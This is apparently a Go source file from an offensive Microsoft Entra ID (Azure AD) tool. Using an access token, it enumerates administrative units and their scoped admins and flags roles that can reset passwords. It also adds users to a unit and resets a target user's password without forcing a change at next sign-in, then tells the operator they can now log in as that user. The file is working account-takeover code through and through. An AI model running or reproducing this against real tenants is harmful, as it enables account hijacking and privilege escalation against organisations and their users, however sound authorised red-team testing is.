package recon

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
)

func ListAdministrativeUnits(accessToken string, socks int) {
	client := newHttpClient(socks)

	fmt.Println("\n[*] Enumerating Administrative Units...")

	// find AUs we have scoped admin roles in
	req, err := http.NewRequest("GET", "https://graph.microsoft.com/v1.0/me/scopedRoleMemberOf", nil)
	if err != nil {
		fmt.Println("[-] Error creating request:", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error making request:", err)
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode == 403 {
		fmt.Println("[-] Access denied enumerating scoped role memberships")
		return
	}

	var scopedRoles struct {
		Value []struct {
			AdministrativeUnitInfo struct {
				ID          string `json:"id"`
				DisplayName string `json:"displayName"`
			} `json:"administrativeUnitInfo"`
		} `json:"value"`
	}

	if err := json.Unmarshal(body, &scopedRoles); err != nil {
		fmt.Println("[-] Error parsing scoped roles:", err)
		return
	}

	auMap := make(map[string]string) // id -> displayName
	for _, sr := range scopedRoles.Value {
		auMap[sr.AdministrativeUnitInfo.ID] = sr.AdministrativeUnitInfo.DisplayName
	}

	// also check memberOf for AUs
	req2, err := http.NewRequest("GET", "https://graph.microsoft.com/v1.0/me/memberOf/microsoft.graph.administrativeUnit", nil)
	if err == nil {
		req2.Header.Set("Authorization", "Bearer "+accessToken)
		resp2, err := client.Do(req2)
		if err == nil {
			body2, _ := io.ReadAll(resp2.Body)
			resp2.Body.Close()
			var memberOf struct {
				Value []struct {
					ID          string `json:"id"`
					DisplayName string `json:"displayName"`
				} `json:"value"`
			}
			if err := json.Unmarshal(body2, &memberOf); err == nil {
				for _, au := range memberOf.Value {
					auMap[au.ID] = au.DisplayName
				}
			}
		}
	}

	if len(auMap) == 0 {
		fmt.Println("[-] No Administrative Units found")
		return
	}

	fmt.Printf("[+] Found %d Administrative Unit(s)\n", len(auMap))

	for auID, auName := range auMap {
		fmt.Printf("\n[+] AU: %s\n", auName)
		fmt.Printf("    ID: %s\n", auID)

		fmt.Println("\n    [*] Scoped Role Members (admins of this AU):")
		listScopedRoleMembers(client, accessToken, auID)

		fmt.Println("\n    [*] AU Members:")
		listAUMembers(client, accessToken, auID)
	}
}

func AddUserToAU(accessToken, auID, userID string, socks int) {
	client := newHttpClient(socks)

	fmt.Printf("\n[*] Adding user %s to AU %s...\n", userID, auID)

	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/directory/administrativeUnits/%s/members/$ref", auID)
	body := fmt.Sprintf(`{"@odata.id": "https://graph.microsoft.com/v1.0/users/%s"}`, userID)

	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		fmt.Println("[-] Error creating request:", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error making request:", err)
		return
	}
	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	switch resp.StatusCode {
	case 204:
		fmt.Printf("[+] Successfully added user %s to AU %s\n", userID, auID)
		fmt.Println("[*] Verifying...")
		if checkUserInAU(client, accessToken, auID, userID) {
			fmt.Printf("[+] Confirmed: user %s is now a member of AU %s\n", userID, auID)
		} else {
			fmt.Println("[-] Verification failed — user may not have been added")
		}
	case 403:
		fmt.Println("[-] Access denied — need User Administrator or higher scoped to this AU")
	case 404:
		fmt.Printf("[-] Not found — check AU ID (%s) and user ID (%s)\n", auID, userID)
	case 400:
		fmt.Printf("[-] Bad request: %s\n", string(respBody))
	default:
		fmt.Printf("[-] Unexpected status %d: %s\n", resp.StatusCode, string(respBody))
	}
}

func ResetUserPassword(accessToken, auID, userID, newPassword string, socks int) {
	client := newHttpClient(socks)

	if newPassword == "" {
		newPassword = generatePassword()
		fmt.Printf("[*] No password specified — generated: %s\n", newPassword)
	}

	fmt.Printf("\n[*] Resetting password for user %s (AU: %s)...\n", userID, auID)

	if !checkUserInAU(client, accessToken, auID, userID) {
		fmt.Printf("[-] User %s not found in AU %s\n", userID, auID)
		fmt.Println("[*] Use administrativeUnits -addUser first, or verify the user/AU IDs")
		return
	}

	payload := map[string]interface{}{
		"passwordProfile": map[string]interface{}{
			"forceChangePasswordNextSignIn": false,
			"password":                      newPassword,
		},
	}
	payloadBytes, _ := json.Marshal(payload)

	req, err := http.NewRequest("PATCH", fmt.Sprintf("https://graph.microsoft.com/v1.0/users/%s", userID), strings.NewReader(string(payloadBytes)))
	if err != nil {
		fmt.Println("[-] Error creating request:", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error making request:", err)
		return
	}
	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	switch resp.StatusCode {
	case 204:
		fmt.Println("[+] Password reset successful")
		fmt.Printf("    User:     %s\n", userID)
		fmt.Printf("    Password: %s\n", newPassword)
		fmt.Println("\n[*] You can now authenticate as this user")
	case 403:
		fmt.Println("[-] Access denied — possible reasons:")
		fmt.Println("    - User holds a directory-wide role (protected by Entra)")
		fmt.Println("    - Your scoped role doesn't cover password reset (need User Admin or Helpdesk Admin)")
	case 404:
		fmt.Printf("[-] User %s not found\n", userID)
	case 400:
		fmt.Printf("[-] Bad request (password may not meet complexity requirements): %s\n", string(respBody))
	default:
		fmt.Printf("[-] Unexpected status %d: %s\n", resp.StatusCode, string(respBody))
	}
}

// helpers

func listScopedRoleMembers(client *http.Client, accessToken, auID string) {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/directory/administrativeUnits/%s/scopedRoleMembers", auID)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("    [-] Error creating request:", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("    [-] Error making request:", err)
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode == 403 {
		fmt.Println("    [-] Access denied listing scoped role members")
		return
	}

	var result struct {
		Value []struct {
			RoleID         string `json:"roleId"`
			RoleMemberInfo struct {
				ID                string `json:"id"`
				DisplayName       string `json:"displayName"`
				UserPrincipalName string `json:"userPrincipalName"`
			} `json:"roleMemberInfo"`
		} `json:"value"`
	}

	if err := json.Unmarshal(body, &result); err != nil {
		fmt.Println("    [-] Error parsing response:", err)
		return
	}

	if len(result.Value) == 0 {
		fmt.Println("    [-] No scoped role members found")
		return
	}

	for _, member := range result.Value {
		roleName := resolveRoleName(client, accessToken, member.RoleID)
		fmt.Printf("    [!] %s → %s (%s)\n", roleName, member.RoleMemberInfo.DisplayName, member.RoleMemberInfo.UserPrincipalName)

		roleLower := strings.ToLower(roleName)
		switch {
		case strings.Contains(roleLower, "user administrator"):
			fmt.Println("        [!!!] Can reset passwords + add users in this AU")
		case strings.Contains(roleLower, "helpdesk"):
			fmt.Println("        [!!!] Can reset passwords of non-admin users in this AU")
		case strings.Contains(roleLower, "authentication"):
			fmt.Println("        [!!!] Can manage MFA/auth methods in this AU")
		case strings.Contains(roleLower, "groups"):
			fmt.Println("        [!] Can manage groups in this AU")
		case strings.Contains(roleLower, "license"):
			fmt.Println("        [~] Can assign licenses in this AU")
		}
	}
}

func listAUMembers(client *http.Client, accessToken, auID string) {
	nextLink := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/directory/administrativeUnits/%s/members?$select=id,displayName,userPrincipalName,@odata.type",
		auID,
	)

	total := 0
	for nextLink != "" {
		req, err := http.NewRequest("GET", nextLink, nil)
		if err != nil {
			fmt.Println("    [-] Error creating request:", err)
			return
		}
		req.Header.Set("Authorization", "Bearer "+accessToken)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("    [-] Error making request:", err)
			return
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 403 {
			fmt.Println("    [-] Access denied listing AU members")
			return
		}

		var result struct {
			Value []struct {
				OdataType         string `json:"@odata.type"`
				ID                string `json:"id"`
				DisplayName       string `json:"displayName"`
				UserPrincipalName string `json:"userPrincipalName"`
			} `json:"value"`
			OdataNextLink string `json:"@odata.nextLink"`
		}

		if err := json.Unmarshal(body, &result); err != nil {
			fmt.Println("    [-] Error parsing response:", err)
			return
		}

		for _, m := range result.Value {
			total++
			switch m.OdataType {
			case "#microsoft.graph.user":
				fmt.Printf("    [user]   %s (%s) — %s\n", m.DisplayName, m.UserPrincipalName, m.ID)
			case "#microsoft.graph.group":
				fmt.Printf("    [group]  %s — %s\n", m.DisplayName, m.ID)
			case "#microsoft.graph.device":
				fmt.Printf("    [device] %s — %s\n", m.DisplayName, m.ID)
			default:
				fmt.Printf("    [?] %s %s — %s\n", m.OdataType, m.DisplayName, m.ID)
			}
		}

		nextLink = result.OdataNextLink
	}

	if total == 0 {
		fmt.Println("    [-] No members found (AU is empty)")
	} else {
		fmt.Printf("\n    [+] Total members: %d\n", total)
	}
}

func checkUserInAU(client *http.Client, accessToken, auID, userID string) bool {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/directory/administrativeUnits/%s/members/%s", auID, userID)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

func resolveRoleName(client *http.Client, accessToken, roleID string) string {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/directoryRoles/%s", roleID)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return roleID
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	resp, err := client.Do(req)
	if err != nil {
		return roleID
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	var role struct {
		DisplayName string `json:"displayName"`
	}
	if err := json.Unmarshal(body, &role); err != nil || role.DisplayName == "" {
		return roleID
	}
	return role.DisplayName
}

func generatePassword() string {
	const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const lower = "abcdefghijklmnopqrstuvwxyz"
	const digits = "0123456789"
	const special = "!@#$%^&*"
	const all = upper + lower + digits + special

	pw := []byte{
		upper[rand.Intn(len(upper))],
		lower[rand.Intn(len(lower))],
		digits[rand.Intn(len(digits))],
		special[rand.Intn(len(special))],
	}
	for i := 0; i < 10; i++ {
		pw = append(pw, all[rand.Intn(len(all))])
	}
	rand.Shuffle(len(pw), func(i, j int) { pw[i], pw[j] = pw[j], pw[i] })
	return string(pw)
}
